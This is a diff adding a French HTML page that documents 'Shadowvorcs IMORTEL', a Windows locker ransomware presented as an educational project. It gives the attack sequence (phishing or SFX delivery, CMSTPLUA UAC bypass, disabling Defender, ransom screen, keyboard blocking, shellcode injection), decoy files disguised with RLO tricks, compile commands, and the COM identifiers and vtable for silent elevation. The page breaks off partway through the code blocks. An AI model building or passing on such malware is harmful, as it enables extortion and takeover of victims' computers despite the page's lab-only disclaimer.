@@ -1,0 +1,1504 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/png" href="https://i.imgur.com/dJba4Ml.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHADOWVORCS - IMORTEL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --neon-red: #ff0a0a;
+            --neon-red-glow: #ff3333;
+            --neon-red-dark: #cc0000;
+            --neon-red-dim: #990000;
+            --bg-dark: #0a0a0a;
+            --bg-darker: #050505;
+            --bg-card: #0f0f0f;
+            --text-dim: #444;
+            --text-main: #888;
+            --border-glow: rgba(255, 10, 10, 0.3);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background: var(--bg-dark);
+            color: var(--text-main);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(ellipse at 20% 20%, rgba(255, 10, 10, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 80%, rgba(255, 10, 10, 0.05) 0%, transparent 50%),
+                repeating-linear-gradient(
+                    0deg,
+                    transparent,
+                    transparent 2px,
+                    rgba(255, 10, 10, 0.02) 2px,
+                    rgba(255, 10, 10, 0.02) 4px
+                );
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.1) 0px,
+                rgba(0, 0, 0, 0.1) 1px,
+                transparent 1px,
+                transparent 3px
+            );
+            pointer-events: none;
+            z-index: 9999;
+            opacity: 0.3;
+        }
+
+        header {
+            position: relative;
+            padding: 60px 20px;
+            text-align: center;
+            border-bottom: 1px solid var(--border-glow);
+            background: linear-gradient(180deg, rgba(255, 10, 10, 0.05) 0%, transparent 100%);
+        }
+
+        .logo-container {
+            position: relative;
+            display: inline-block;
+        }
+
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: clamp(2rem, 7vw, 4.5rem);
+            font-weight: 900;
+            color: var(--neon-red);
+            text-transform: uppercase;
+            letter-spacing: 0.3em;
+            text-shadow: 
+                0 0 10px var(--neon-red),
+                0 0 20px var(--neon-red),
+                0 0 40px var(--neon-red-glow),
+                0 0 80px var(--neon-red-glow),
+                0 0 120px var(--neon-red-dark);
+            animation: flicker 4s infinite;
+        }
+
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            92% { opacity: 1; }
+            93% { opacity: 0.8; }
+            94% { opacity: 1; }
+            96% { opacity: 0.9; }
+            97% { opacity: 1; }
+        }
+
+        .subtitle {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.2rem;
+            font-weight: 300;
+            color: var(--neon-red-dim);
+            letter-spacing: 0.5em;
+            margin-top: 20px;
+            text-transform: uppercase;
+        }
+
+        .tagline {
+            font-size: 0.9rem;
+            color: var(--text-dim);
+            margin-top: 30px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.8;
+        }
+
+        nav {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(5, 5, 5, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border-glow);
+            padding: 15px 20px;
+        }
+
+        .nav-inner {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .nav-link {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--text-dim);
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 0.15em;
+            padding: 8px 15px;
+            border: 1px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        .nav-link:hover {
+            color: var(--neon-red);
+            border-color: var(--neon-red);
+            box-shadow: 
+                0 0 10px rgba(255, 10, 10, 0.3),
+                inset 0 0 10px rgba(255, 10, 10, 0.1);
+            text-shadow: 0 0 10px var(--neon-red);
+        }
+
+        main {
+            position: relative;
+            z-index: 1;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .section {
+            margin-bottom: 60px;
+        }
+
+        .section-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--neon-red);
+            text-transform: uppercase;
+            letter-spacing: 0.2em;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--neon-red-dim);
+            text-shadow: 
+                0 0 10px var(--neon-red),
+                0 0 20px var(--neon-red-dark);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .section-title::before {
+            content: '//';
+            color: var(--neon-red-dim);
+        }
+
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 25px;
+        }
+
+        .tool-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-glow);
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .tool-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--neon-red), transparent);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .tool-card:hover::before {
+            opacity: 1;
+        }
+
+        .tool-card:hover {
+            border-color: var(--neon-red-dim);
+            box-shadow: 
+                0 0 30px rgba(255, 10, 10, 0.1),
+                inset 0 0 30px rgba(255, 10, 10, 0.02);
+        }
+
+        .tool-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border-glow);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .tool-icon {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid var(--neon-red-dim);
+            color: var(--neon-red);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.8rem;
+            font-weight: 700;
+        }
+
+        .tool-name {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--neon-red);
+            text-shadow: 0 0 10px var(--neon-red-dark);
+        }
+
+        .tool-desc {
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            margin-top: 5px;
+        }
+
+        .tool-body {
+            padding: 20px;
+        }
+
+        .command-block {
+            background: var(--bg-darker);
+            border-left: 3px solid var(--neon-red-dim);
+            padding: 15px;
+            margin-bottom: 15px;
+            font-size: 0.85rem;
+            overflow-x: auto;
+        }
+
+        .command-block:last-child {
+            margin-bottom: 0;
+        }
+
+        .command-label {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: var(--neon-red-dim);
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            margin-bottom: 8px;
+        }
+
+        .command-code {
+            color: var(--neon-red-glow);
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .options-table {
+            width: 100%;
+            font-size: 0.8rem;
+            border-collapse: collapse;
+        }
+
+        .options-table th {
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 600;
+            color: var(--neon-red);
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            text-align: left;
+            padding: 10px;
+            border-bottom: 1px solid var(--neon-red-dim);
+        }
+
+        .options-table td {
+            padding: 8px 10px;
+            border-bottom: 1px solid rgba(255, 10, 10, 0.1);
+            vertical-align: top;
+        }
+
+        .options-table tr:last-child td {
+            border-bottom: none;
+        }
+
+        .opt-flag {
+            color: var(--neon-red-glow);
+            font-weight: bold;
+            white-space: nowrap;
+        }
+
+        .opt-desc {
+            color: var(--text-main);
+        }
+
+        .category-header {
+            background: linear-gradient(90deg, rgba(255, 10, 10, 0.1), transparent);
+            padding: 8px 10px;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--neon-red);
+            text-transform: uppercase;
+            letter-spacing: 0.15em;
+            margin: 15px 0 10px 0;
+        }
+
+        .tool-card.full-width {
+            grid-column: 1 / -1;
+        }
+
+        .stats-bar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            justify-content: center;
+            padding: 30px 20px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-glow);
+            margin-bottom: 40px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-number {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2rem;
+            font-weight: 900;
+            color: var(--neon-red);
+            text-shadow: 0 0 20px var(--neon-red-dark);
+        }
+
+        .stat-label {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 0.2em;
+            margin-top: 5px;
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px 20px;
+            border-top: 1px solid var(--border-glow);
+            margin-top: 60px;
+        }
+
+        .footer-text {
+            font-size: 0.75rem;
+            color: var(--text-dim);
+            letter-spacing: 0.1em;
+        }
+
+        .footer-link {
+            color: var(--neon-red-dim);
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .footer-link:hover {
+            color: var(--neon-red);
+            text-shadow: 0 0 10px var(--neon-red);
+        }
+
+        .warning-box {
+            background: rgba(255, 170, 0, 0.05);
+            border: 1px solid rgba(255, 170, 0, 0.3);
+            border-left: 3px solid #ffaa00;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 0.8rem;
+            color: #ffaa00;
+        }
+
+        @media (max-width: 768px) {
+            .tools-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .nav-inner {
+                gap: 5px;
+            }
+
+            .nav-link {
+                font-size: 0.65rem;
+                padding: 6px 10px;
+            }
+
+            h1 {
+                letter-spacing: 0.1em;
+            }
+
+            .subtitle {
+                letter-spacing: 0.2em;
+            }
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-darker);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--neon-red-dim);
+            border-radius: 0;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--neon-red);
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo-container">
+            <h1>SHADOWVORCS IMORTEL</h1>
+        </div>
+        <p class="subtitle">Ransomware Locker Windows — Analyse Éducative - IMORTEL</p>
+        <p class="tagline">Ransomware Windows locker obfusqué (RLO, PDF, SFX .scr), bypass UAC (CMSTPLUA), désactivation Defender/UAC, écran de rançon plein écran, hook clavier, injection de shellcode, redirection web malveillante. Application C++ native utilisant l'API Win32. Uniquement à des fins éducatives en environnement lab sécurisé.</p>
+    </header>
+
+    <nav>
+        <div class="nav-inner">
+            <a href="#presentation" class="nav-link">Présentation</a>
+            <a href="#architecture" class="nav-link">Architecture</a>
+            <a href="#environnement" class="nav-link">Environnement</a>
+            <a href="#compilation" class="nav-link">Compilation</a>
+            <a href="#bloc-includes" class="nav-link">Includes</a>
+            <a href="#bloc-com" class="nav-link">COM / UAC</a>
+            <a href="#bloc-shellcode" class="nav-link">Shellcode</a>
+            <a href="#bloc-ransomware" class="nav-link">Ransomware</a>
+            <a href="#bloc-systeme" class="nav-link">Prise de Contrôle</a>
+            <a href="#obfuscation" class="nav-link">Obfuscation RLO</a>
+            <a href="#bibliotheques" class="nav-link">Bibliothèques</a>
+            <a href="#terminal" class="nav-link">Terminal</a>
+        </div>
+    </nav>
+
+    <main>
+        <div class="stats-bar">
+            <div class="stat-item">
+                <div class="stat-number">C++</div>
+                <div class="stat-label">Langage</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">Win32</div>
+                <div class="stat-label">API</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">x86</div>
+                <div class="stat-label">| x64</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">9</div>
+                <div class="stat-label">Blocs Code</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">v1.0</div>
+                <div class="stat-label">Version</div>
+            </div>
+        </div>
+
+        <!-- PRÉSENTATION -->
+        <section id="presentation" class="section">
+            <h2 class="section-title">Présentation de Shadowvorcs</h2>
+            <div class="tools-grid">
+
+                <div class="tool-card full-width">
+                    <div class="tool-header">
+                        <div class="tool-icon">SV</div>
+                        <div>
+                            <div class="tool-name">SHADOWVORCS v1.0</div>
+                            <div class="tool-desc">Ransomware de type "locker" avec capacités de persistance et d'évasion de défenses</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="warning-box">
+                            ⚠️ <strong>PROJET ÉDUCATIF UNIQUEMENT</strong> — Ce code est fourni strictement à des fins pédagogiques et d'analyse technique. Doit être utilisé exclusivement dans un environnement lab sécurisé et isolé.
+                        </div>
+
+                        <p style="font-size: 0.85rem; color: var(--text-main); margin: 15px 0; line-height: 1.8;">Application <strong style="color: var(--neon-red-glow);">Windows native</strong> développée en <strong style="color: var(--neon-red-glow);">C++ pur</strong> utilisant l'API Win32 de Microsoft. Zéro framework, zéro surcouche — uniquement du code système bas niveau. Conçu pour prendre le contrôle total d'un système Windows, désactiver ses protections et bloquer l'accès utilisateur.</p>
+
+                        <div class="category-header">Fonctionnalités Principales</div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">Bypass UAC</td><td class="opt-desc">Contournement de l'UAC via vulnérabilité COM CMSTPLUA — exécution admin sans invite</td></tr>
+                            <tr><td class="opt-flag">Désactivation Défenses</td><td class="opt-desc">Désactivation UAC + protection temps réel Windows Defender via PowerShell élevé</td></tr>
+                            <tr><td class="opt-flag">Blocage Clavier</td><td class="opt-desc">Hook clavier interceptant et supprimant toutes les frappes utilisateur</td></tr>
+                            <tr><td class="opt-flag">Shellcode Injection</td><td class="opt-desc">Injection et exécution de code machine directement en mémoire (VirtualAlloc)</td></tr>
+                            <tr><td class="opt-flag">Écran de Rançon</td><td class="opt-desc">Interface plein écran non fermable avec message d'extorsion (optionnel)</td></tr>
+                            <tr><td class="opt-flag">Redirection Web</td><td class="opt-desc">Ouverture forcée du navigateur vers un site malveillant</td></tr>
+                            <tr><td class="opt-flag">Persistance</td><td class="opt-desc">Modifications système pour maintenir l'accès malgré les redémarrages</td></tr>
+                            <tr><td class="opt-flag">Furtivité</td><td class="opt-desc">Techniques COM pour éviter la détection par les solutions antivirus</td></tr>
+                        </table>
+
+                        <div class="category-header">Mode Opératoire</div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">Étape 1</td><td class="opt-desc">Exécution initiale (phishing, exploit, SFX auto-extractible)</td></tr>
+                            <tr><td class="opt-flag">Étape 2</td><td class="opt-desc">Contournement UAC via CMSTPLUA pour droits administrateur</td></tr>
+                            <tr><td class="opt-flag">Étape 3</td><td class="opt-desc">Désactivation des protections système (Defender, UAC)</td></tr>
+                            <tr><td class="opt-flag">Étape 4</td><td class="opt-desc">Affichage de l'interface de rançon + collecte infos réseau</td></tr>
+                            <tr><td class="opt-flag">Étape 5</td><td class="opt-desc">Blocage complet des interactions utilisateur (hook clavier)</td></tr>
+                            <tr><td class="opt-flag">Étape 6</td><td class="opt-desc">Exécution du shellcode pour actions malveillantes additionnelles</td></tr>
+                        </table>
+
+                        <div class="category-header">Technologies</div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">Programmation</td><td class="opt-desc">Win32 API — C++ pur, aucune dépendance externe</td></tr>
+                            <tr><td class="opt-flag">Rendu Graphique</td><td class="opt-desc">GDI32 — Graphics Device Interface</td></tr>
+                            <tr><td class="opt-flag">Architecture COM</td><td class="opt-desc">COM / OLE — Component Object Model pour bypass UAC</td></tr>
+                            <tr><td class="opt-flag">Planification</td><td class="opt-desc">TaskSchd — Windows Task Scheduler via COM</td></tr>
+                            <tr><td class="opt-flag">Compilation</td><td class="opt-desc">g++ MinGW — x86 & x64</td></tr>
+                        </table>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- ARCHITECTURE -->
+        <section id="architecture" class="section">
+            <h2 class="section-title">Architecture du Projet</h2>
+            <div class="tools-grid">
+
+                <div class="tool-card full-width">
+                    <div class="tool-header">
+                        <div class="tool-icon">ARC</div>
+                        <div>
+                            <div class="tool-name">Arborescence Fichiers</div>
+                            <div class="tool-desc">Structure complète du projet IMORTEL-Shadowvorcs</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="command-block">
+                            <div class="command-label">Structure du projet</div>
+                            <code class="command-code">IMORTEL/
+├── imortel.cpp      ← Code source principal (C++ Win32)
+├── imortel.exe      ← Exécutable compilé (Windows x86/x64)
+├── Imortel.ico      ← Icône de l'application (.ico)
+├── README.md        ← Documentation Markdown
+├── imortel.bat      ← Script batch — exécute les composants
+├── imortel.png      ← Screenshot / Leurre stéganographique
+├── imortel.pdf      ← Leurre PDF (optionnel)
+└── imortel.zip      ← Archive complète du projet</code>
+                        </div>
+
+                        <table class="options-table">
+                            <tr><td class="opt-flag">imortel.cpp</td><td class="opt-desc">Code source C++ complet — 9 blocs fonctionnels, API Win32</td></tr>
+                            <tr><td class="opt-flag">imortel.exe</td><td class="opt-desc">Exécutable compilé — payload opérationnel</td></tr>
+                            <tr><td class="opt-flag">imortel.bat</td><td class="opt-desc">Lance le leurre (PDF/PNG) + l'exécutable en parallèle</td></tr>
+                            <tr><td class="opt-flag">Imortel.ico</td><td class="opt-desc">Icône personnalisée pour donner une apparence légitime au SFX</td></tr>
+                            <tr><td class="opt-flag">imortel.zip</td><td class="opt-desc">Archive contenant l'intégralité du projet</td></tr>
+                        </table>
+
+                        <div class="category-header">Structure du Code Source — 9 Blocs</div>
+                        <div class="command-block">
+                            <div class="command-label">imortel.cpp — Blocs fonctionnels</div>
+                            <code class="command-code">imortel.cpp
+│
+├── [BLOC 01]  INCLUDES & HEADERS
+├── [BLOC 02]  DIRECTIVES DE LIAISON COM
+├── [BLOC 03]  DÉFINITIONS COM POUR LE BYPASS UAC
+├── [BLOC 04]  FONCTION DE BYPASS UAC
+├── [BLOC 05]  SHELLCODE MALVEILLANT
+├── [BLOC 06]  FONCTION D'EXÉCUTION DU SHELLCODE
+├── [BLOC 07]  FONCTIONS D'AFFICHAGE RANSOMWARE
+├── [BLOC 08]  INTERCEPTION DES ENTRÉES CLAVIER
+└── [BLOC 09]  PRISE DE CONTRÔLE SYSTÈME</code>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- ENVIRONNEMENT & INSTALLATION -->
+        <section id="environnement" class="section">
+            <h2 class="section-title">Environnement & Installation</h2>
+            <div class="tools-grid">
+
+                <div class="tool-card" id="prerequis">
+                    <div class="tool-header">
+                        <div class="tool-icon">ENV</div>
+                        <div>
+                            <div class="tool-name">Prérequis Système</div>
+                            <div class="tool-desc">Configuration requise pour compiler et exécuter Shadowvorcs</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <table class="options-table">
+                            <tr><td class="opt-flag">OS</td><td class="opt-desc">Windows 7 / 8 / 10 / 11 (32 ou 64 bits)</td></tr>
+                            <tr><td class="opt-flag">Compilateur</td><td class="opt-desc">g++ (MinGW-w64) ≥ 8.0</td></tr>
+                            <tr><td class="opt-flag">IDE</td><td class="opt-desc">CLion ou Visual Studio Code (recommandé)</td></tr>
+                            <tr><td class="opt-flag">Shell</td><td class="opt-desc">PowerShell / CMD / Git Bash</td></tr>
+                        </table>
+                    </div>
+                </div>
+
+                <div class="tool-card" id="mingw-install">
+                    <div class="tool-header">
+                        <div class="tool-icon">GCC</div>
+                        <div>
+                            <div class="tool-name">Installation MinGW-w64</div>
+                            <div class="tool-desc">Compilateur g++ pour Windows — compilation C++ native</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <p style="font-size: 0.8rem; color: var(--text-dim); margin-bottom: 10px;">Télécharger depuis <span style="color: var(--neon-red-glow);">winlibs.com</span> ou <span style="color: var(--neon-red-glow);">msys2.org</span>, extraire dans C:\mingw64\</p>
+                        <div class="command-block">
+                            <div class="command-label">Ajout au PATH Windows</div>
+                            <code class="command-code">Panneau de configuration
+  └── Système
+        └── Paramètres système avancés
+              └── Variables d'environnement
+                    └── PATH → Modifier → Nouveau
+                          └── C:\mingw64\bin</code>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-label">Vérification de l'installation</div>
+                            <code class="command-code">g++ --version</code>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-label">Résultat attendu</div>
+                            <code class="command-code">g++ (x86_64-posix-seh-rev0, Built by MinGW-Builds project) 13.x.x</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="tool-card" id="vscode-ext">
+                    <div class="tool-header">
+                        <div class="tool-icon">VSC</div>
+                        <div>
+                            <div class="tool-name">Extensions VS Code</div>
+                            <div class="tool-desc">Extensions recommandées pour le développement C++</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <table class="options-table">
+                            <tr><td class="opt-flag">C/C++</td><td class="opt-desc">ms-vscode.cpptools — IntelliSense, débogage, navigation</td></tr>
+                            <tr><td class="opt-flag">C/C++ Extension Pack</td><td class="opt-desc">ms-vscode.cpptools-extension-pack — Pack complet</td></tr>
+                            <tr><td class="opt-flag">Code Runner</td><td class="opt-desc">formulahendry.code-runner — Exécution rapide du code</td></tr>
+                        </table>
+                        <div class="command-block">
+                            <div class="command-label">Se placer dans le répertoire du projet</div>
+                            <code class="command-code">cd C:\Users\anon\Desktop\IMORTEL</code>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- COMPILATION -->
+        <section id="compilation" class="section">
+            <h2 class="section-title">Compilation — Guide Complet</h2>
+            <div class="tools-grid">
+
+                <div class="tool-card" id="build-x32">
+                    <div class="tool-header">
+                        <div class="tool-icon">x32</div>
+                        <div>
+                            <div class="tool-name">VERSION 1 — x32 Linkage Statique</div>
+                            <div class="tool-desc">Compilation 32 bits avec toutes les dépendances intégrées</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="command-block">
+                            <div class="command-label">Commande de compilation</div>
+                            <code class="command-code">g++ -o imortel.exe imortel.cpp -m32 -luser32 -lgdi32 -lshell32 -lwinmm -lole32 -loleaut32 -static</code>
+                        </div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">-o imortel.exe</td><td class="opt-desc">Nom du fichier de sortie</td></tr>
+                            <tr><td class="opt-flag">imortel.cpp</td><td class="opt-desc">Fichier source à compiler</td></tr>
+                            <tr><td class="opt-flag">-m32</td><td class="opt-desc">Force la compilation en mode 32 bits (x86)</td></tr>
+                            <tr><td class="opt-flag">-luser32</td><td class="opt-desc">User32 — fenêtres, messages, clavier, souris</td></tr>
+                            <tr><td class="opt-flag">-lgdi32</td><td class="opt-desc">GDI32 — rendu graphique, formes, texte, bitmap</td></tr>
+                            <tr><td class="opt-flag">-lshell32</td><td class="opt-desc">Shell32 — ShellExecute, gestion fichiers, icônes</td></tr>
+                            <tr><td class="opt-flag">-lwinmm</td><td class="opt-desc">WinMM — son, timers multimédias</td></tr>
+                            <tr><td class="opt-flag">-lole32</td><td class="opt-desc">OLE32 — COM, interfaces objets</td></tr>
+                            <tr><td class="opt-flag">-loleaut32</td><td class="opt-desc">OleAut32 — automatisation OLE, VARIANT, BSTR</td></tr>
+                            <tr><td class="opt-flag">-static</td><td class="opt-desc">Intègre les runtimes → exe standalone sans DLL</td></tr>
+                        </table>
+                    </div>
+                </div>
+
+                <div class="tool-card" id="build-x64">
+                    <div class="tool-header">
+                        <div class="tool-icon">x64</div>
+                        <div>
+                            <div class="tool-name">VERSION 2 — x64 Task Scheduler</div>
+                            <div class="tool-desc">Compilation 64 bits avec support du planificateur Windows (recommandé)</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="command-block">
+                            <div class="command-label">Commande de compilation (recommandé)</div>
+                            <code class="command-code">g++ imortel.cpp -o imortel.exe -luser32 -lgdi32 -lshell32 -lwinmm -lole32 -loleaut32 -ltaskschd</code>
+                        </div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">-ltaskschd</td><td class="opt-desc">TaskSchd — Windows Task Scheduler via COM (ITaskService, ITaskFolder, IRegisteredTask)</td></tr>
+                            <tr><td class="opt-flag">(sans -m32)</td><td class="opt-desc">Compilation en 64 bits (défaut MinGW-w64)</td></tr>
+                            <tr><td class="opt-flag">(sans -static)</td><td class="opt-desc">Linkage dynamique — exe plus léger</td></tr>
+                        </table>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- BLOC 01 — INCLUDES -->
+        <section id="bloc-includes" class="section">
+            <h2 class="section-title">BLOC 01 — Includes & Headers</h2>
+            <div class="tools-grid">
+
+                <div class="tool-card full-width">
+                    <div class="tool-header">
+                        <div class="tool-icon">01</div>
+                        <div>
+                            <div class="tool-name">Includes & Headers</div>
+                            <div class="tool-desc">Déclaration de toutes les bibliothèques système utilisées</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="command-block">
+                            <div class="command-label">Code — Bloc 01</div>
+                            <code class="command-code">#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;thread&gt;
+#include &lt;string&gt;
+#include &lt;sstream&gt;
+#include &lt;vector&gt;
+#include &lt;ctime&gt;
+#include &lt;cstdlib&gt;
+#include &lt;conio.h&gt;
+#include &lt;comdef.h&gt;
+#include &lt;objbase.h&gt;</code>
+                        </div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">windows.h</td><td class="opt-desc">Fonctions API Windows — manipulation du système</td></tr>
+                            <tr><td class="opt-flag">iostream</td><td class="opt-desc">Entrées/sorties standard (cout, cin)</td></tr>
+                            <tr><td class="opt-flag">thread</td><td class="opt-desc">Création de threads — exécution parallèle</td></tr>
+                            <tr><td class="opt-flag">string / sstream</td><td class="opt-desc">Manipulation de chaînes de caractères</td></tr>
+                            <tr><td class="opt-flag">vector</td><td class="opt-desc">Conteneurs dynamiques</td></tr>
+                            <tr><td class="opt-flag">ctime / cstdlib</td><td class="opt-desc">Fonctions temporelles et utilitaires</td></tr>
+                            <tr><td class="opt-flag">conio.h</td><td class="opt-desc">Entrées/sorties console (_kbhit, _getch)</td></tr>
+                            <tr><td class="opt-flag">comdef.h / objbase.h</td><td class="opt-desc">Support COM pour le bypass UAC</td></tr>
+                        </table>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- BLOC COM / UAC -->
+        <section id="bloc-com" class="section">
+            <h2 class="section-title">BLOCS 02–04 — COM & Bypass UAC</h2>
+            <div class="tools-grid">
+
+                <div class="tool-card" id="bloc02">
+                    <div class="tool-header">
+                        <div class="tool-icon">02</div>
+                        <div>
+                            <div class="tool-name">Directives de Liaison COM</div>
+                            <div class="tool-desc">Liaison automatique des bibliothèques COM au compilateur</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="command-block">
+                            <div class="command-label">Code — Bloc 02</div>
+                            <code class="command-code">#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "oleaut32.lib")</code>
+                        </div>
+                        <p style="font-size: 0.8rem; color: var(--text-dim); margin-top: 10px;">Ces directives <code style="color: var(--neon-red-glow);">#pragma</code> indiquent au compilateur de lier automatiquement les bibliothèques COM <strong style="color: var(--neon-red-glow);">ole32.lib</strong> et <strong style="color: var(--neon-red-glow);">oleaut32.lib</strong> nécessaires à l'interaction avec les objets COM Windows.</p>
+                    </div>
+                </div>
+
+                <div class="tool-card" id="bloc03">
+                    <div class="tool-header">
+                        <div class="tool-icon">03</div>
+                        <div>
+                            <div class="tool-name">Définitions COM — CMSTPLUA</div>
+                            <div class="tool-desc">Interface virtuelle COM pour le contournement UAC</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="command-block">
+                            <div class="command-label">Code — Identifiants COM</div>
+                            <code class="command-code">const CLSID CLSID_CMSTPLUA = {
+    0x3E5FC7F9, 0x9A51, 0x4367,
+    { 0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7 }
+};
+
+const IID IID_ICMLuaUtil = {
+    0x6EDD6D74, 0xC007, 0x4E75,
+    { 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C }
+};</code>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-label">Code — Structure VTable ICMLuaUtil</div>
+                            <code class="command-code">typedef struct ICMLuaUtilVtbl {
+    BEGIN_INTERFACE
+    HRESULT (STDMETHODCALLTYPE *QueryInterface)(...);
+    ULONG   (STDMETHODCALLTYPE *AddRef)(...);
+    ULONG   (STDMETHODCALLTYPE *Release)(...);
+    HRESULT (STDMETHODCALLTYPE *Method1 à Method6)(...);
+    HRESULT (STDMETHODCALLTYPE *ShellExec)(
+        ICMLuaUtil*, LPCWSTR, LPCWSTR,
+        LPCWSTR, LPCWSTR, int
+    );
+    END_INTERFACE
+} ICMLuaUtilVtbl;</code>
+                        </div>
+                        <p style="font-size: 0.8rem; color: var(--text-dim); margin-top: 10px;">Cette structure définit l'interface virtuelle pour l'objet <strong style="color: var(--neon-red-glow);">COM CMSTPLUA</strong>. La méthode <code style="color: var(--neon-red-glow);">ShellExec</code> est utilisée pour exécuter des commandes avec des privilèges élevés sans invite UAC.</p>
+                    </div>
+                </div>
+
+                <div class="tool-card full-width" id="bloc04">
+                    <div class="tool-header">
